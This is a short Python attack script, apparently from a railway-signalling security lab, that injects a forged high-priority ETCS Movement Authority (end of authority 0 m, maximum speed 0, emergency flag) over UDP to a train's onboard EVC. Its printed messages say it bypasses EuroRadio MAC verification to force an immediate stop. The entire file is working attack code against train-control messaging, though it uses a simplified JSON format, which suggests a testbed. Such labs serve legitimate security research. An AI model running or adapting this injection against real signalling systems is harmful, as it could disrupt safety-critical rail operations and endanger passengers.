import socket
import json

EVC_IP = "12.1.1.130"
EVC_PORT = 5002

print("[ATTACK PRIORITY] Injection d'un message haute priorité sans HMAC...")
print("[ATTACK PRIORITY] Ce message bypasse la vérification MAC — faille EuroRadio")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

fake_ma = {
    "type": "3",
    "priority": "high",
    "train_id": "TRAIN_001",
    "eoa": 0,
    "v_max": 0,
    "emergency": True
}

print(f"[ATTACK PRIORITY] Envoi MA haute priorité — EOA=0m, v_max=0 — arrêt immédiat")
sock.sendto(json.dumps(fake_ma).encode(), (EVC_IP, EVC_PORT))
print(f"[ATTACK PRIORITY] Message envoyé")
sock.close()
